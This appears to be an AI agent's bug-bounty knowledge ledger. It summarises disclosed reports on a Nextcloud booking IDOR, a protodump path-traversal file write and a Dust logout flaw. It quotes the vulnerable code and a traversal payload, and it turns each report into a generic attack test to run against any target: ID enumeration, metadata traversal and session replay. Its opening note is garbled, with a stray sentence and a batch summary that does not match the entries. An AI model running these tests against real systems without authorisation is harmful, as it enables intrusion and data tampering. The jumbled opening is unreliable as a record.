NOTE — reader pass 2026-11-10 batch 141 (6 assigned sources read ONE BY ONE in the given order; 2 entries appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`; 1 new §17 slot). (2) HackerOne #1339034 (Judge.me, "Blind XSS via Feedback form.", reporter b3hlull, submitted 2021-09-14, resolved, disclosed 2022-05-03, High 8.0, weakness Cross-site Scripting (XSS) - Stored; read in full via `web_extract` + the local disclosed-reports mirror) — a post-installation "No, please remove all widgets" feedback form stores a blind-XSS payload that renders on `judge.me/admin`, which is behind HTTP Basic Auth: the session cookie is not obtainable, but the injected script can XHR the admin panel's own pages (the browser auto-attaches the cached Basic credentials) and exfiltrate admin/cross-shop content; DELTA of the admin-visible-XSS class (§17.106) with a NEW ENTRY POINT and a NEW IMPACT MODIFIER, NO §17 slot. If the response carries it, the reset is self-completing." No new entry, no §17 slot. SOURCE: https://hackerone.com/reports/3275810  2026-11-10
ROUTE: live `.json` route -> HTTP 200, `visibility: no-content`, 0 B `vulnerability_information` (the reporter body is NOT public; the live HTML page returns only the timeline/metadata, and the browser tool returns a HackerOne "Sorry, something went wrong" error page). The technique was recovered from the report's OWN credited public writeup — the Nextcloud security advisory GHSA-7x2j-2674-fj95 (read in full via `web_extract`) — plus the PUBLIC FIX DIFF in `nextcloud/calendar` read this pass from `raw.githubusercontent.com`: `appinfo/routes.php` and `lib/Controller/BookingController.php` at `v4.7.18` vs `v4.7.19`. Cross-checked against CVE-2025-66546 (Aqua/Opencve mirrors). Metadata: Nextcloud, "Calendar app allowed booking appointments without the generated token", weakness Insecure Direct Object Reference (IDOR), severity Low 3.3, reporter `daroo`, submitted 2025-07-29, disclosed 2025-12-05, state Closed/Resolved, asset `nextcloud/calendar` (SOURCE_CODE, max_severity critical).
STATUS: UNVERIFIED (not reproduced — no Nextcloud instance was touched this pass; the mechanism below is verified from the PUBLIC FIX DIFF, not from a live target).
CLASS: IDOR / BOLA — a booking endpoint keyed by a SEQUENTIAL INTEGER ID instead of the secret booking token (CWE-639, Authorization Bypass Through User-Controlled Key).
CORE METHOD:
  1. THE ADVISORY ONE-LINER, verbatim: "The calendar app allowed blindly booking appointments with a squential ID without known the appointment token." (Nextcloud's own advisory GHSA-7x2j-2674-fj95; patched 4.7.19 / 5.5.6 / 6.0.1; weakness CWE-639.)
  2. THE VULNERABLE ROUTES (v4.7.18 `appinfo/routes.php`), verbatim: `['name' => 'booking#getBookableSlots', 'url' => '/appointment/{appointmentConfigId}/slots', 'verb' => 'GET']` and `['name' => 'booking#bookSlot', 'url' => '/appointment/{appointmentConfigId}/book', 'verb' => 'POST']` — the object reference is an INTEGER id.
  3. THE VULNERABLE CONTROLLER (v4.7.18), verbatim: `public function getBookableSlots(int $appointmentConfigId, ...)` -> `$config = $this->appointmentConfigService->findById($appointmentConfigId);` and `public function bookSlot(int $appointmentConfigId, int $start, int $end, string $displayName, string $email, string $description, string $timeZone)` -> `findById($appointmentConfigId)`.
  4. THE FIX (v4.7.19), verbatim: the routes become `/appointment/{appointmentConfigToken}/slots` and `/appointment/{appointmentConfigToken}/book`; the controller becomes `string $appointmentConfigToken` -> `$config = $this->appointmentConfigService->findByToken($appointmentConfigToken);`. The token is a STRING; the id was an INT.
  5. THE SHAPE, therefore: the "generated token" the UI hands the user is a sequential auto-increment integer; the token check is absent because the integer id IS the key. The confirm route already used a string token (`/appointment/confirm/{token}`), so the booking route was the odd one out.
DETECTION SIGNAL: a booking / appointment / reservation / scheduling endpoint whose path parameter is an INTEGER id while the UI and the sibling confirm route use a "token"; a route param typed `int` beside a `string $token` route for the same object; a public booking link whose id is enumerable (auto-increment); a fix that renames `{id}` -> `{token}` and the finder from `findById` -> `findByToken`; an endpoint whose own name says "token" (`.../appointment/<x>/book`) while the framework binds `<x>` as an int.
CHAIN: any unauthenticated visitor (the appointment booking page is a PUBLIC link) -> the appointment-config id is a sequential integer (primitive: an enumerable object reference) -> `GET /appointment/<id>/slots` returns another user's bookable slots (escalation: read of a stranger's appointment availability) -> `POST /appointment/<id>/book` with `start`/`end`/`timeZone`/`displayName`/`email`/`description` writes a booking onto the victim's calendar (impact: an unauthenticated attacker books appointments on any user's calendar without the token; the advisory's own words: "blindly booking appointments with a squential ID without known the appointment token"). Per doctrine §8: preconditions = reachability of the public booking route and a guessable/sequential config id; gain = an unauthorized calendar write. The program rated it Low 3.3 (AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N) after downgrading from High 7.5 and Medium 6.2 — the low rating is the program's own and does not change the class.
TRANSFERABLE TEST: on ANY target with a token/secret-keyed public endpoint (booking, sharing, file download, form, magic link) — (1) capture the public link and note whether the object reference is a high-entropy token or a SEQUENTIAL INTEGER; (2) if it is an integer, walk the id space (+1/-1, then a wider sweep) and call the READ endpoint (`GET .../slots`, `GET .../download`, `GET .../view`) with each id; (3) then call the WRITE endpoint with the same id and a payload; (4) if the object resolves and the write succeeds without the token, the token is decorative. Rule: **a "secret token" that is implemented as a sequential integer is not a secret — enumerate the id space and the token check evaporates.**
DEDUPE: 0 hits across all three write targets for `3275810`, `appointment`, `findByToken`, `bookSlot`, `getBookableSlots`, `booking token`, `nextcloud/calendar`, or a token-keyed route implemented as an int id. The `CWE-639` (54/39/24), `sequential ID` (9/6/5) and `decorative` (6/4/2) hits are generic IDOR-enumeration material and a decorative CI/CD login gate — none records the specific delta that the endpoint's OWN token naming conceals an integer primary key. New general method -> §17.434.

SOURCE: https://hackerone.com/reports/3384150  2026-11-10
ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, full body read (Summary, the vulnerable `Filename()` and main() code, the attack vector, the embedded PoC, the Impact and the affected version; no fallback route needed). Metadata: arkadiyt-projects, "Arbitrary File Write", weakness Path Traversal, severity High 8.6, reporter `newby99`, submitted 2025-10-14, disclosed 2025-10-19, state Resolved, no CVE.
STATUS: UNVERIFIED (not reproduced — no protodump binary was built or run this pass; every code snippet and quote below is verbatim from the report).
CLASS: path traversal / arbitrary file write — a CLI parser derives its OUTPUT PATH from a field INSIDE THE INPUT ARTIFACT (the protobuf `go_package` option), with no containment check (CWE-22 -> CWE-73).
CORE METHOD:
  1. THE SINK, verbatim (`pkg/protodump/protodump.go`): `func (pd *ProtoDefinition) Filename() string { goPackage := pd.pb.GetOptions().GetGoPackage(); index := strings.Index(goPackage, ";"); if index == -1 { return pd.descriptor.Path() }; // BUG: No sanitization of goPackage path; return path.Join(goPackage[:index], path.Base(pd.descriptor.Path())) }`
  2. THE WRITE, verbatim (main): `filename := definition.Filename(); if strings.HasSuffix(filename, ".proto") { dir := path.Join(*output, path.Dir(filename)); final := path.Join(dir, path.Base(filename)); os.MkdirAll(dir, 0700); os.WriteFile(final, []byte(definition.String()), 0700); fmt.Printf("Wrote %s\n", final) }`
  3. THE PAYLOAD, verbatim: `syntax = "proto3"; package exploit; // Malicious path traversal; option go_package = "../../../tmp/pwned;exploit"; message MaliciousMessage { string data = 1; }` — embedded in the binary under analysis.
  4. THE IMPACT, verbatim: "arbitrary file write on user's machine" / "the tool writes the extracted proto file outside the intended output directory (overriding any existing files with the same name in the target location)".
  5. THE AFFECTED VERSION, verbatim: "Latest (commit 17ad807, verified October 2025) Repository: https://github.com/arkadiyt/protodump Installation: go install github.com/arkadiyt/protodump/cmd/protodump@latest".
DETECTION SIGNAL: a tool that PARSES an input artifact (binary, archive, image, document, proto/AVRO/Thrift, PDF, Office) and derives an output/export path from a field INSIDE that artifact; the path is built as `path.Join(output, attackerField)` with NO `strings.HasPrefix(final, output)` containment check; a metadata field that becomes a directory component (`go_package`, `package`, `namespace`, `@xml:base`, archive entry names, document author/title); an `os.MkdirAll(dir)` + `os.WriteFile(final)` pair where `dir` comes from the artifact.
CHAIN: an attacker who can get the victim to run the parser on a malicious artifact (primitive: a malicious file — a shared binary, an uploaded sample, a dependency, a CI artifact, a "please review this build" drop) -> the parser reads the artifact's OWN metadata (`go_package`) as a path component (primitive: input metadata used as a filesystem path) -> `path.Join(output, "../../../tmp/pwned")` escapes the output directory (escalation: no containment check) -> `os.MkdirAll` + `os.WriteFile` create/overwrite an arbitrary file (impact: arbitrary file write — overwrite a config, a cron file, an SSH key, a `~/.bashrc`, or a file watched by a supervisor -> RCE). Per doctrine §8: preconditions = the victim runs the tool on an attacker-supplied artifact; gain = arbitrary file write on the victim's machine. Program rated High 8.6.
TRANSFERABLE TEST: on ANY tool that parses an input artifact and writes derived output files — (1) find the field inside the artifact that becomes a path component (proto `go_package`, archive entry names, document metadata, image EXIF, `package`/`namespace`, `@xml:base`); (2) inject traversal sequences into that field (`../../..`, absolute paths, `;`-suffixed values, Windows `..\\`); (3) run the tool on the artifact and check whether a file is created OUTSIDE the declared output directory (the report's own check: `if !strings.HasPrefix(finalAbs, output)`); (4) if a containment check exists, try alternate separators, Unicode normalization, and `path.Base`/`path.Dir` quirks. Rule: **when a parser derives an output path from a field inside the input artifact, the traversal payload lives in the FILE'S OWN METADATA, not in a request parameter — inject `../` into the artifact's metadata field and check whether the write escapes the output directory.**
DEDUPE: 0 hits across all three write targets for `3384150`, `protodump`, `go_package`, `arkadiyt/protodump`, `parsed metadata`, `input file`, `binary metadata`, or a metadata-driven output path. The `protobuf` hits (3/6/0) are the Valve CS:GO EntityMsg RCE (#3000 family) and a length-prefixed parser loop (~3221) — both unrelated. The `arkadiyt` hits (3/2/0) are the `ssrf_filter` NAT64 entry (§17.213 / #3634400). The 91/85/23 `path traversal` hits are generic traversal material; none records a traversal whose payload is the INPUT ARTIFACT'S OWN PARSED METADATA. New general method -> §17.435.

SOURCE: https://hackerone.com/reports/3101207  2026-11-10
ROUTE: live `.json` route -> HTTP 200, 6,728 B, `visibility: full`, `vulnerability_information` 1,490 B read IN FULL (`curl` + desktop UA). Metadata: Dust, "Improper Session Invalidation – Auto Sign-In Without Credentials After Logout (Affects Chrome & Firefox)", weakness Insufficient Session Expiration, severity medium, reporter `pent0ss`, submitted 2025-04-19, disclosed 2025-04-29, state Closed/Resolved, asset `https://eu.dust.tt/` (URL, max_severity critical).
STATUS: UNVERIFIED (not reproduced — no dust.tt account or session was touched this pass; every quote below is verbatim from the report body).
CLASS: insufficient session expiration — LOGOUT does not terminate the session, and the LOGIN PAGE silently re-authenticates the user with no credentials (CWE-613).
CORE METHOD:
  1. THE SUMMARY, verbatim: "When a user logs out, the session is not invalidated properly. Revisiting the login page allows automatic re-authentication without any user input. This means the session remains active or is being improperly restored."
  2. THE STEPS, verbatim: "1. Log in to the web application with a valid account. 2. Click on the 'Logout' button. 3. Stay in the same browser, or open a new tab with the site. 4. Click on 'Sign In' or visit the login page. ### Observe: User is automatically signed back in without entering email/password"
  3. THE BROWSER SCOPE, verbatim: "Tested on: - Google Chrome - Mozilla Firefox. Behavior is consistent across multiple browsers".
  4. THE IMPACT, verbatim: "Logout becomes meaningless, giving a false sense of security. If someone else gains temporary or physical access to the browser, they can easily regain access to the account without credentials. Risk is amplified in environments like internet cafés, libraries, or if a device is lost/stolen."
DETECTION SIGNAL: after clicking Logout, the LOGIN PAGE (or a "Sign In" click) silently re-authenticates the user with no credential prompt; the session cookie/token is never cleared; the logout response is a 200/redirect that does not invalidate the server-side session; a "Sign In" link that immediately redirects into the app instead of presenting a credential form; a second browser tab that is still authenticated after the first tab logged out.
CHAIN: an attacker with access to the victim's browser or a stolen session (primitive: a shared device, a log line, a proxy, an XSS session capture) -> the victim clicks Logout, believing the session is dead (primitive: the UI reports a successful logout) -> the logout call does not invalidate the server-side session AND the login page silently restores it (escalation: the "remediation" is a no-op) -> the attacker reopens the login page and is authenticated with no credentials (impact: account access without credentials; the program rated it Medium). Per doctrine §8: preconditions = prior session/browser access; gain = authenticated access after the victim logged out.
TRANSFERABLE TEST: on ANY web app — (1) log in and capture the session cookie/token at T0; (2) click Logout and confirm the UI reports success; (3) WITHOUT re-entering credentials, GET the login page (or click "Sign In") in the same browser: if you are silently signed in, logout is a no-op; (4) separately replay the T0 cookie/token against an authenticated endpoint after logout — a 200 with the account confirms the session outlives logout. Rule: **test logout by reloading the LOGIN PAGE, not just the app — if the login page silently re-authenticates you, the session was never terminated.**
DEDUPE: the replay-after-logout test is recorded at §17.394 (Shopify Ping — a revoke endpoint requiring a "logout token hint" the shipped client omits) and the class at §17.432 (Airflow Fab — the admin CLI password change does not revoke) / #1547684 (Shopify — unlinking an external provider does not revoke its sessions). The DELTA here is the DETECTION SIGNAL and the TEST ENTRY POINT: the LOGIN PAGE ITSELF restores the session, so no token capture or replay is needed — log out and reload the login page. 0 hits across all three write targets for `auto sign-in`, `auto sign in`. Recorded as a DELTA of the insufficient-session-expiration class, NO new §17 slot. HONESTY NOTE: standalone impact presumes physical/prior session access, which doctrine §2(a) marks ineligible standalone — recorded as an auth-lifecycle chain primitive, not a standalone unauthenticated finding.

NOTE — reader pass 2026-11-10 batch 142 (6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`; 2 new §17 slots). NEW: (1) HackerOne #3275810 (Nextcloud Calendar, "Calendar app allowed booking appointments without the generated token", reporter daroo, submitted 2025-07-29, resolved/disclosed 2025-12-05, Low 3.3 — AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N, weakness IDOR, CVE-2025-66546 / GHSA-7x2j-2674-fj95; `visibility: no-content`, technique recovered from the credited public advisory + the PUBLIC FIX DIFF v4.7.18 -> v4.7.19) — the booking routes were keyed by `{appointmentConfigId}` (an int) and the controller did `findById()`; the fix renames them to `{appointmentConfigToken}` and calls `findByToken()`; the "generated token" is a sequential auto-increment integer, so the token check evaporates and anyone can read/book another user's appointment slots; NEW general method -> §17.434. (2) HackerOne #3384150 (arkadiyt-projects / protodump, "Arbitrary File Write", reporter newby99, submitted 2025-10-14, resolved/disclosed 2025-10-19, High 8.6, weakness Path Traversal; read in full via `web_extract`) — `ProtoDefinition::Filename()` builds the output path from the `go_package` option INSIDE the analyzed binary's protobuf descriptor (`path.Join(goPackage[:index], path.Base(...))`) and main() does `path.Join(*output, path.Dir(filename))` + `os.MkdirAll` + `os.WriteFile` with no containment check, so `option go_package = "../../../tmp/pwned;exploit"` makes the tool write outside its output directory -> arbitrary file write; NEW general method -> §17.435. (3) HackerOne #3101207 (Dust, "Improper Session Invalidation – Auto Sign-In Without Credentials After Logout", reporter pent0ss, submitted 2025-04-19, disclosed 2025-04-29, medium, weakness Insufficient Session Expiration; read in full on the live `.json` route) — logout does not terminate the session and merely VISITING THE LOGIN PAGE (or clicking "Sign In") silently re-authenticates the user with no credentials; DELTA of the insufficient-session-expiration class (§17.394 / §17.432 / #1547684) with a NEW DETECTION SIGNAL (the login page restores the session — no token capture/replay needed), NO §17 slot. DUPLICATE (read in full, nothing new, nothing invented): HackerOne #3401612 (Revive Adserver, "IDOR Vulnerability in Banner Deletion", reporter cyberjoker, submitted 2025-10-27, resolved/disclosed 2025-11-19, High 7.1, weakness IDOR, CVE-2025-52670) — `GET /www/admin/banner-delete.php?token=<CSRF>&clientid=<yours>&campaignid=<yours>&bannerid=<victim>` authorizes the parent client/campaign but never the child banner, and the reporter found it by diffing the fixed sibling `campaign-delete.php`; this is EXACTLY the recorded §17.339 (same report, same endpoint, same "parent-authorized / child-unchecked" shape and the same sibling-diff discovery method). HackerOne #3369843 (Lovable VDP, "Low-privileged user can enable or disable Lovable AI for new projects in workspace", reporter anxioussick, submitted 2025-10-03, resolved/disclosed 2025-11-07, team-rated low, weakness Improper Authorization) — `DELETE /workspaces/<workspace_id>/tool-preferences/ai_gateway/enable` and `POST` with `{"approval_preference":"disable"}` replayed against another workspace with a low-privileged role; this is EXACTLY the recorded §17.309 (same endpoint, same body, same "action in the PATH / value in the body" tell and the same no-server-side-role-check mechanism; §17.309 was taken from the sibling report #3371448). INVALID (no entry, nothing invented): HackerOne #2947762 (Yelp, "RXSS AT https://proze.yelp.com/tmsubscribe.net/vidsn.aspx", reporter 0xold, submitted 2025-01-19, resolved/disclosed 2025-06-30, Medium 5.0, weakness Cross-site Scripting (XSS) - Reflected) — `visibility: no-content` with a 0 B `vulnerability_information` on the live `.json` route; the live HTML page shows only Yelp's team summary ("Endpoints on proze.yelp.com were vulnerable to Cross-Site Scripting (XSS) which allowed attackers to inject malicious scripts and affect the security of users of the domain.") and a timeline with no reporter body; `r.jina.ai` -> HTTP 401 IP-reputation block; the Wayback capture (`20251018024636`) is the "JavaScript is disabled" SPA shell; the ajaysenr mirror prints "*No vulnerability information available.*" — no payload, no parameter, no request shape and no bypass mechanics exist publicly, so nothing can be extracted. 6 sources read, 0 fabricated. Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`.
